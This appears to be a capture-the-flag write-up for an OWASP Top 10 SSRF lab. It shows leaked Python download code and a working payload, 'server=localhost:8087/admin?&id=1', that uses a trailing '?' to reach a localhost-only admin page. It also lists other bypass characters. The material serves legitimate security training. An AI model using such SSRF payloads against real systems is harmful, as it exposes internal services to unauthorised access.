---
description: >-
  This challenge deals with a Server-Side Request Forgery (SSRF) vulnerability
  that is present in the server query parameter.
---

# OWASP Top 10 - 2021 (task 22)

_**Extra practice challenge: "Going the extra mile"**_

> There's a way to use SSRF to gain access to the site's admin area. Can you find it?

A GET request is sent to the following href to download the resume:

`/download?server=secure-file-storage.com:8087&id=75482342`

General format of the HTTP URL:

`http://<url>:8087/download?server=<server_addr>&id=<file_id>`



### Gathering information&#x20;

1. Visiting the following URL [http://10.10.106.252:8087/admin](http://10.10.106.252:8087/admin), presented me with a webpage displaying the following message:&#x20;

_**Admin interface only available from localhost!!!**_

2. I have noticed that an error message of: _ValueError: invalid literal for int() with base 10: 't',_ with snippets of the code-base (sensitive information) is shown when a non-integer value is provided to the `id` query parameter.&#x20;

The following code snippet is shown in the error message from a GET request to the following URL:

`http://<url>:8087/download?server=&id=t`

```python
def download():
    file_id = request.args.get('id','')
    server = request.args.get('server','')

    if file_id!='':
        filename = str(int(file_id)) + '.pdf'
        
        response_buf = BytesIO()
        crl = pycurl.Curl()
        crl.setopt(crl.URL, server + '/public-docs-k057230990384293/' + filename)
        crl.setopt(crl.WRITEDATA, response_buf)
```

### Payload to the `server` query parameter

1. `?`

Consider the following line:&#x20;

```python
crl.setopt(crl.URL, server + '/public-docs-k057230990384293/' + filename)
```

Inserting a ? character at the end of the value passed to the server query parameter will trick the server to treat the rest of the input (`'/public-docs-k057230990384293/' + filename`) as a query. Thus, effectively ignoring its values, allowing an attacker to fully control the server address.

The following payload allows me to send a request to the **/admin** path from within the server localhost, bypassing the restriction&#x73;**.**

`10.10.106.252:8087/download?server=localhost:8087/admin?&id=1`



2. `#`
3. `@`, `%2F`, `//`

